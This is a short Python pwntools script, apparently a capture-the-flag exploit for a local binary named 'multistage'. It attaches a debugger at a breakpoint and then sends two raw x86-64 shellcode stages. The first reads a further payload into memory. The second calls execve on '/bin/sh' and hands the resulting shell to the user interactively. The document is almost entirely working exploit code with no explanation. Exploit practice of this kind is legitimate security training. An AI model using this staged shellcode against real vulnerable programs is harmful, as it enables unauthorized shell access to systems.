from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

r = process("./multistage")

gdb.attach(r, '''
    b *0x40123f
    c
''')
input("wait")

r.send(b"\x48\x89\xC6\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC2\xFF\x00\x00\x00\x0F\x05")
time.sleep(0.5)
r.send(b"\x48\x89\xC7\x48\x83\xC7\x25\x48\x31\xF6\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00")

r.interactive()